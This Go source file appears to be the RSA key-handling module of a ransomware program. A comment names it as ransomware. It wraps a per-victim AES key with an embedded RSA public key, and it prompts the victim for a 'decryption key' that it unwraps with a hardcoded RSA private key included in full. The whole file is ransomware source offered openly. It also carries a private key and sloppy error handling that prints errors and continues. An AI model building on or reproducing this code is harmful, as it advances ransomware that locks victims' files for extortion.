package rsa

import (
	"fmt"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/pem"
	"encoding/hex"
)

//In real ransomware private key will never be hardcoded in the program but stored in some remote server.

var (
	PRIV_KEY = []byte(`
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA0vEOmrYHXdKOx83EloPOww0fi/uRQsr2JXXx62MTlioyMaiO
1ou4b9psvokWStsyk9sK/oJpyr/w0ntfYNH8IyQvK2VvwHVhmpsO8VrLEYhnqG0f
9UiaGrKNazQ+STI0KtGUNevT5RvMPDZ34O+JeY9Q/oKmDrGgWYrBxU1TK35Y97tO
LSdpNWqKpgZYJSJtcUjfkImmIOvPcj85SKdLsHPXgG2gdO2V9yupJOES18lElf3Y
FtSGlEy0uYeNAfLwqjoNAsLTCwFR9iT2dxE1sHZLwQGsfPE014MZBNLXq2H8Q8kF
Ef/lM9jERVy5Huyx9wh02+r7f9g3uRPfpea2IwIDAQABAoIBAQC9dqaXb0fOjYCR
FdCtIFZl+zOKl7oxM/tCSl2v/p1pEx1iXPNu4LAYRyfFO3w6YAddpjCJyLkc0qmL
ZCSW4gSFy8pSQBnP056HLx6Mye/7H3l7XgiGV1+S+yzqTVJkjCMvEm78v4TjE8St
kH68GmpwNLma394m9IQB6Q+CF6HMPV37tpX6rQzMeBSjpPnib6tim7/PwjhDXQdA
7mmh+tr5PPZcJxHSkjvm9fiTCJjErp4CWx6FXO5PZPk4MRG9bcP25cFH56GexgKg
COD0UrsPo/aA5AHBG5Mv4J/wzTp39NFwQq2Gr7YWOM2EvSfvoBf879MCAypLR62R
PNekQLeBAoGBAPJP/iSGS9FODmIVOmdR/liE3ibtm7OAovMPOsjcKzoe4VluRSzD
/VGqSl7WgpbNnzEOElmBfYhWbEIVs81646FWURyamMXwwOOW3g/ND8YBToz8J/IH
LfnxU+8+KbBv30UAEufQzJQLaHMkbmAPr93pzUgrJn5ft1s2I2qdTmD9AoGBAN7b
a4h9TYonfs55BtHT3WTL0gsLKF0Qx3Uz0I2T61jOE28ASTwfAMPO2uP6cg5RP0mp
xIYG2e86PnzzYvqKnFnQj/maKA+4CQk9eoc08vcneG+hdMAS9vtjfRkjozCIwIkJ
3nuR7hhILIaUdr9K5+cPofNYXmzHralCQBelnC2fAoGAJd1MKGb3+AgLhVYt3zFX
3ns8v7aHiyBB1lt94x9MffOPYUsy8hDaR+WlY3Z/x5LwGllJksUCWciveBAuHaDj
azWyzRZ3Yw8BBU9w+eUgXt+bZ7qLf22RyKnmZM9A8no42G5vhdwB6+xwcPWzbb1l
zPaZBnr/s+W/IDiwhht4wP0CgYB1r+gEpy84gwzrGmyoiDrFTQF6BYVmSEMcuKUs
7u188y6+EqeaEUFFJkrf09VBjFRgoT+AC8QxGk//ikQ9zM8uev5dMLRxQJ28/HNl
TWf1bymhweC2wg0dync4vGIkckNC2yxbkz/qIMsqsuJWuMbodY/vwz3yMiyaUrso
AbQNPwKBgAHUHmJFdUhlfm6nWrGDiTdtgMPJeRl97VIfVrXfzaj5VtZ9k/Vz7wfj
HZonHjfqG5beIr4FQigN3Wwew5e1d9RhAvtM+yGjk2M1r4u4JjK62JAv7wRPlpWO
zdfuPgMcvoAVmkMnANp0caHHo3roR2iZoZ+jJlVA7Nx7/0SUZ686
-----END RSA PRIVATE KEY-----`)

	PUB_KEY = []byte(`
-----BEGIN RSA PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0vEOmrYHXdKOx83EloPO
ww0fi/uRQsr2JXXx62MTlioyMaiO1ou4b9psvokWStsyk9sK/oJpyr/w0ntfYNH8
IyQvK2VvwHVhmpsO8VrLEYhnqG0f9UiaGrKNazQ+STI0KtGUNevT5RvMPDZ34O+J
eY9Q/oKmDrGgWYrBxU1TK35Y97tOLSdpNWqKpgZYJSJtcUjfkImmIOvPcj85SKdL
sHPXgG2gdO2V9yupJOES18lElf3YFtSGlEy0uYeNAfLwqjoNAsLTCwFR9iT2dxE1
sHZLwQGsfPE014MZBNLXq2H8Q8kFEf/lM9jERVy5Huyx9wh02+r7f9g3uRPfpea2
IwIDAQAB
-----END RSA PUBLIC KEY-----`)

)

func EncryptRsa(AESkey []byte) ([]byte, error) {
	
    publicKeyBlock, _ := pem.Decode(PUB_KEY)
    
    publicKey, err := x509.ParsePKIXPublicKey(publicKeyBlock.Bytes)
    if err != nil {
        fmt.Println(err)
    }

    ciphertext, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, publicKey.(*rsa.PublicKey), AESkey, []byte(""))
    if err != nil {
        fmt.Println(err)
    }

	return ciphertext, nil

}

func DecryptRsa() ([]byte, error) {

	fmt.Println("please enter your decryption key:")
	
	var key string

	fmt.Scanln(&key)

	decodKey, err := hex.DecodeString(key)
	if err != nil {
		fmt.Println(err)
	}

	privateKeyBlock, _ := pem.Decode(PRIV_KEY)
    
    privateKey, err := x509.ParsePKCS1PrivateKey(privateKeyBlock.Bytes)
    if err != nil {
        panic(err)
    }

    plaintext, err := rsa.DecryptOAEP(sha256.New(), rand.Reader, privateKey, decodKey, []byte(""))
    if err != nil {
        panic(err)
    }

	return plaintext, nil
}